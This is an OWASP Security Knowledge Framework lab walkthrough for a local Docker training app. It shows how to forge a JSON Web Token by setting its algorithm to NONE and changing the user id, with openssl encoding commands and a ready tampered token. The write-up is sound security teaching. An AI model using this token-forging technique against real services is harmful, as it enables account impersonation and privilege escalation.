# JWT Null

## Running the app on Docker

```
$ sudo docker pull blabla1337/owasp-skf-lab:js-jwt-null
```

```
$ sudo docker run -ti -p 127.0.0.1:5000:5000 blabla1337/owasp-skf-lab:js-jwt-null
```

{% hint style="success" %}
Now that the app is running let's go hacking!
{% endhint %}

## Reconnaissance

### Step1

The application shows a dropdown menu from which we can choose an intro or chapters to be displayed on the client-side.

![](../../.gitbook/assets/nodejs/JWT-null/1.png)

First thing we need to do know is to do more investigation on the requests that are being made. We do this by setting up our intercepting proxy so we can gain more understanding of the application under test.

After we set up our favourite intercepting proxy we are going to look at the traffic between the server and the front-end. Enter the credentials: _username: user_ \| _password:user_

The first thing to notice is after sucessful logon, the response contains an access token.

![](../../.gitbook/assets/nodejs/JWT-null/2.png)

The image above shows the access-token contains three base64 encoded splitted with two dots \(.\) separators, which indicates it's a JSON Web Token \(JWT\):

#### Header

```javascript
{
 "alg": "HS256",
 "typ": "JWT"
}
```

#### Claims

```javascript
{
  "id": 1,
  "iat": 1641553962,
  "exp": 1641557562
}
```

#### Signature

Last encrypted part, containing the digital signature for the token..

## Exploitation

### Step 1

A potential attacker can now decode the token in [http://jwt.io](http://jwt.io) website to check its content.

![](../../.gitbook/assets/nodejs/JWT-null/3.png)

As shown in the above picture, there are 2 points which can be tampered.

- alg header: contains the information of which algorithm is being used for digital signature of the token.
- indentity: this information is used by the application to identify which user ID is currently authenticated.

How about checking if the server is blindly accepting the digital signature algorithm as stored by token. Of course, changing the signature would also change the token signature, but, what if the server accepts NONE algorithm?

The NONE algorithm means signature is not required, so the token can be tampered and will be accepted by the server.

=======

### Step 2

#### Header tampering

```javascript
{
 "alg": "NONE",
 "typ": "JWT"
}
```

Let's base64 encode the header:

```
echo -n '{"alg":"NONE","typ":"JWT"}' | openssl base64
```

![](../../.gitbook/assets/nodejs/JWT-null/4.png)

Now, let's play with the identity:

```javascript
{
  "id": 1,
  "iat": 1641553962,
  "exp": 1641557562
}
```

Let's base64 encode the identity:

```
echo -n '{"id":2,"iat":1641553962,"exp": 1641557562}' | openssl base64
```

![](../../.gitbook/assets/nodejs/JWT-null/5.png)

As the signature is not required, the new tampered JWT token will look like this:

> eyJhbGciOiJOT05FIiwidHlwIjoiSldUIn0.eyJpZCI6MiwiaWF0IjoxNjQxNTUzOTYyLCJleHAiOiAxNjQxNTU3NTYyfQ.

\_note: Remove whitespaces to base64 encode properly. Remove any = after encoding. Make sure to add the trailing dot after the tampered identity.

### Step 2

Open the local storage tab within the browser and replace the original token:

![](../../.gitbook/assets/nodejs/JWT-null/7.png)

Now hit the _Admin_ button and check if the tampered token was accepted.

![](../../.gitbook/assets/nodejs/JWT-null/6.png)

Yes! The server accepted the tampered access-token. Can we check if there are more users available which can be impersonated?

## Additional Resources

Please refer to the JWT.io information for more information regarding JWT.

{% embed url="https://jwt.io/introduction/" %}

Also consider OWASP JWT Cheat Sheet as reference.

{% embed url="https://cheatsheetseries.owasp.org/cheatsheets/JSON_Web_Token_for_Java_Cheat_Sheet.html" %}

Other:

{% embed url="https://owasp.org/www-chapter-vancouver/assets/presentations/2020-01_Attacking_and_Securing_JWT.pdf" %}
